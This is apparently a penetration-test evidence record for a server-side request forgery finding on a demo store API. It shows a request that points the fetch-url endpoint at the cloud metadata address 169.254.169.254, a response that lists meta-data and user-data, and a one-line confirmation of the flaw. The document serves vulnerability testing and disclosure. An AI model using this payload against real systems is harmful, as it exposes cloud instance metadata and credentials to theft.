## Evidence: ssrf-fetch-url — SSRF via Fetch URL

### Request
GET /api/v1/uploads/fetch-url?url=http://169.254.169.254/latest/ HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJ...

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"FetchUrl":"http://169.254.169.254/latest/","preview":"meta-data\nuser-data","link-preview":"rendered","status":"fetched"}

### Analysis
The fetch-url endpoint acts as an open proxy for link-preview rendering. The FetchUrl parameter follows arbitrary internal URLs, confirming ssrf.
